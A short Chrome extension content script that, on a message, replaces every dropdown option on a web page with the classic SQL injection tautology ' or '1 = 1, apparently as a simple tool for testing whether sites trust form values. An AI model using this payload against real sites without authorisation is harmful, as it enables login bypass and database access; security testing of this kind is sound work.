'use strict';

function dropdownInject(){
  //Gather all the dropdown lists
  var dropdowns = document.getElementsByTagName('select');
  //Set injection tactic
  var injectionString = "<option value = \"\' or \'1 = 1\">Inject</option>"
  //Replace dropdown option with injection
  for (var i = 0, l = dropdowns.length; i < l; i++) {
    dropdowns[i].innerHTML = injectionString;
  }
}


chrome.runtime.onMessage.addListener(
  function(request, sender, sendResponse) {
    //alert(request.message);
    if (request.message === "inject_to_dropdowns"){
      dropdownInject();
      alert("Injected");
      chrome.runtime.sendMessage({"message": "Injection Completed"})
    }
  }
);